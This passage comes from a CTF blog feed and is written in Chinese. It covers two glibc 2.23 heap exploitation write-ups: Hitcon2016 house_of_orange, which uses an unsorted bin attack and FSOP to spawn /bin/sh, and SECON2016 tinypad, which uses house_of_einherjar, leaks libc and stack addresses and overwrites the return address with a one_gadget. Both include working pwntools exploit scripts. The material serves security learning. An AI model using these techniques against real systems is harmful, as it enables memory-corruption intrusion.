addr</span></span><br><span class="line">upgrade(<span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">heap_addr = u64(io.recvline()[<span class="number">16</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pf(<span class="string">&quot;heap addr&quot;</span>, heap_addr)</span><br></pre></td></tr></table></figure><p>分配large size的块，泄露libc base和heap addr，因为large bin会将fd_nextsize和bk_nextsize存储在chunk中（unsorted bin中的唯一chunk被取出放在large bin中，然后切割分配。如果是small size，则会在unsorted bin 中直接切割分配）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">   only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">   runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">   exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">   no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin-attack-amp-amp-FSOP"><a href="#unsorted-bin-attack-amp-amp-FSOP" class="headerlink" title="unsorted bin attack &amp;&amp; FSOP"></a>unsorted bin attack &amp;&amp; FSOP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x420</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>)      <span class="comment"># start offset: 0x0--fake size</span></span><br><span class="line">payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span> + p64(libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]<span class="number">-0x10</span>)  <span class="comment"># start offset: 0x10--unsorted bin attack</span></span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x90</span>  <span class="comment"># start offset: 0x20--满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>    <span class="comment"># start offset: 0xc0--满足fp-&gt;_mode &lt;= 0</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x430</span>+<span class="number">0xe0</span>)  <span class="comment"># start offset: 0xd8--vtable</span></span><br><span class="line">payload += p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])*<span class="number">4</span> <span class="comment"># start offset: 0xe0--_IO_OVERFLOW=system</span></span><br><span class="line">upgrade(len(payload), payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/listall.001.jpeg"></p><h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>概率性的出错，有时候<code>_IO_list_all</code>指向的第一个<code>struct _IO_FILE_plus</code>会满足<code>_IO_OVERFLOW</code>的执行条件，而我们伪造的在第二个，从而执行出错。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">     )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>在我调试过程中发现<code>_IO_vtable_offset(fp) == 0</code>这个验证不存在，下图中的条件编译应该是选择了后者。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725235629121.png" alt="image-20200725235629121"></p><p><code>fp-&gt;_mode &gt; 0</code>中的_mode是int类型，依赖于libc地址随机。如果恰巧最高位为0，这个条件也就被满足了。</p><p><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>正好指向bin，因为bin是空的都指向自身，而<code>_IO_write_base</code>位于<code>_IO_write_ptr</code>的低地址处，所以这个条件一定被满足。</p><p>综上，只要随机到_mode所处位置的最高位为0，就会失败。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2016%20house_of_orange/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;info&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;houseoforange&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>           <span class="comment"># GLIBC 2.23-0ubuntu11.2</span></span><br><span class="line"><span class="comment"># locallibc = &quot;../glibc_versions/2.23/x64_notcache/lib/libc-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">length, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span>(<span class="params">length, name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Price of Orange: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Color of Orange: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    build(<span class="number">0x200</span> - <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    upgrade(<span class="number">0x1b0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x1d8</span> + p64(<span class="number">0xe01</span>))</span><br><span class="line">    build(<span class="number">0x1000</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b genops.c:759&quot;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x13D5)&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc base </span></span><br><span class="line">    build(<span class="number">0x400</span>, <span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">    libc_addr = u64(io.recvline()[<span class="number">8</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_addr)</span><br><span class="line">    libc_base = libc_addr - <span class="number">0x3C5178</span></span><br><span class="line">    <span class="comment"># libc_base = libc_addr - 0x39C178</span></span><br><span class="line">    pf(<span class="string">&quot;libc base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap addr</span></span><br><span class="line">    upgrade(<span class="number">0x10</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">    heap_addr = u64(io.recvline()[<span class="number">16</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    pf(<span class="string">&quot;heap addr&quot;</span>, heap_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># IO_FILE</span></span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span>*<span class="number">0x420</span></span><br><span class="line">    payload += <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0x61</span>)                               <span class="comment"># start offset: 0x0</span></span><br><span class="line">    payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x8</span> + p64(libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]<span class="number">-0x10</span>)  <span class="comment"># start offset: 0x10</span></span><br><span class="line">    payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x90</span>                              <span class="comment"># start offset: 0x20</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>                                       <span class="comment"># start offset: 0xc0</span></span><br><span class="line">    payload += p64(heap_addr+<span class="number">0x430</span>+<span class="number">0xe0</span>)                                <span class="comment"># start offset: 0xd8</span></span><br><span class="line">    payload += <span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])            <span class="comment"># start offset: 0xe0</span></span><br><span class="line">    upgrade(len(payload), payload)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap house_of_orange.c</li><li><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li><li><a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html">https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;house-of-orange&quot;&gt;&lt;a href=&quot;#house-of-orange&quot; class=&quot;headerlink&quot; title=&quot;house of orange&quot;&gt;&lt;/a&gt;house of orange&lt;/h2&gt;&lt;p&gt;修改&lt;code&gt;topchunk-&amp;gt;size&lt;/code&gt;为一个缩小的并且满足页对齐的大小，malloc一个大于size的块（但也不要大于mmap threshold），会导致原来topchunk被放入unsorted bin。&lt;/p&gt;
&lt;p&gt;当topchunk不足以分配所需空间时，会调用sysmalloc分配额外空间。一般情况下，main_arena中old top chunk和新分配的top chunk首尾相邻，从而会进行合并。当我们将&lt;code&gt;topchunk-&amp;gt;size&lt;/code&gt;减小后，会检测不到相邻，也就不会合并了。设置好fencepost chunk，会执行&lt;code&gt;_int_free (av, old_top, 1)&lt;/code&gt;将其放入unsorted bin。&lt;/p&gt;
&lt;p&gt;代码涉及&lt;code&gt;_int_malloc&lt;/code&gt;后边和&lt;code&gt;sysmalloc&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--house_of_einherjar SECON2016--tinypad</title>
    <link href="http://hhdx.xyz/2020/07/23/How2heap-house-of-einherjar-SECON2016-tinypad/"/>
    <id>http://hhdx.xyz/2020/07/23/How2heap-house-of-einherjar-SECON2016-tinypad/</id>
    <published>2020-07-23T01:57:08.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>和house of force很像，都是篡改top chunk。</p><p>off-by-one覆盖victim chunk的<code>pre_in_use</code>位，并修改<code>victim-&gt;pre_size</code>为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。</p><p><strong>victim需要临近top chunk</strong>，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="SECON2016-tinypad"><a href="#SECON2016-tinypad" class="headerlink" title="SECON2016 tinypad"></a>SECON2016 tinypad</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[A] Add memo</span><br><span class="line">[D] Delete memo</span><br><span class="line">[E] Edit memo</span><br><span class="line">[Q] Quit</span><br></pre></td></tr></table></figure><p>程序有一个tinypad全局变量，前0x100字节当做临时区域，后0x40存放一个结构体数组，结构体如下所示</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200723104723145.png" alt="image-20200723104723145"></p><p>Add：输入size，最大为0x100。后使用read_until读入数据，read_until中存在null byte off-by-one。</p><p>Delete：输入所要删除索引，释放空间，size置0。没有将指针置0，这里存在指针悬空。</p><p>Edit：对数据内容进行修改，使用strcpy拷贝到tinypad处，所以如果有<code>\x00</code>，这里会产生截断。且能够读入的大小为其字符串长度。</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>使用house of einherjar，通过指针悬空泄露堆地址，在tinypad处构造fakechunk。分配得到tinypad后0x40字节，在此处通过got泄露libc base，读出栈地址，将main函数返回地址修改为one gadget。</p><p>由于edit memo的特殊性，所以没办法对诸如<code>__free_hook</code>这样的进行修改，从而想到通过libc中的environ泄露栈地址，修改函数返回地址，而且main函数的返回地址在<code>__libc_start_main</code>附近，它的地址有效字节长度和所需的一致。</p><h3 id="house-of-einherjar-1"><a href="#house-of-einherjar-1" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tinypad    = <span class="number">0x602040</span></span><br><span class="line">one_gadget = <span class="number">0x40d82</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 1: 0x30</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 2: 0x30</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 3: 0x100</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">&quot;\n&quot;</span>)                         <span class="comment"># memo 4: 0x90</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 1\n # CONTENT: &quot;</span>)</span><br><span class="line">heap_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = heap_addr &amp; (~<span class="number">0xfff</span>)</span><br><span class="line">fake_size = heap_base + <span class="number">0x30</span> + <span class="number">0x30</span> - tinypad</span><br></pre></td></tr></table></figure><p>程序存在指针悬空，通过两次释放同样大小的fastbin chunk，第二次释放的chunk-&gt;fd处就存有了heap地址（因为fastbin头插头取）。然后计算fake size。</p><p>memo 3：为目标chunk，溢出覆盖的就是它的<code>pre_in_use</code>，而且将它的chunk size控制在0x100，避免影响其<strong>后续</strong>与top chunk的合并。</p><p>memo4：避免delete(3)后，<strong>此时</strong>就与top chunk合并。同时不能是fastbin大小，要保证后续delete(4)后，其与top chunk进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0xf8</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># memo 1: 0x100</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\n&quot;</span>)                                 <span class="comment"># memo 2: 0x30</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+p64(fake_size) + <span class="string">b&quot;\n&quot;</span>)     <span class="comment"># memo 3: 0x30</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>)+p64(fake_size)+p64(tinypad)+p64(tinypad) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">delete(<span class="number">4</span>)           <span class="comment"># consolidate with top chunk, avoid malloc unsorted bin check error</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>先分配处0xf8，而后使用临近的块溢出，在tinypad处构造fake chunk，释放memo4和memo1，先后与top chunk进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0xe8</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(elf.got[<span class="string">&quot;strlen&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;\n&quot;</span>)     <span class="comment"># avoid free error</span></span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">libc_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x14CBC0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x4009BC&quot;)</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(libc_base+libc.sym[<span class="string">&quot;environ&quot;</span>]) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot; #   INDEX: 2\n # CONTENT: &quot;</span>)</span><br><span class="line">stack_addr = u64(io.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">mainret_addr = stack_addr - <span class="number">0xf0</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit return address</span></span><br><span class="line">add(<span class="number">0x40</span>, p64(<span class="number">0x1</span>) + p64(tinypad+<span class="number">0x100</span>) + p64(<span class="number">0x1</span>) + p64(mainret_addr) + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">edit(<span class="number">2</span>, p64(libc_base+one_gadget) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;(CMD)&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;Q&quot;</span>)</span><br></pre></td></tr></table></figure><p>分配得到数组处的地址，多次释放分配这个数组，来对它进行修改。</p><p>直接释放<code>tinypad+0x100</code>，在对后一个chunk的检查会出错，使用<code>add(0x40, &quot;\n&quot;)</code>分配一个合法的后一个chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 释放fastbin大小对后一个chunk的检查</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放非fastbin大小对后一个chunk的检查</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a 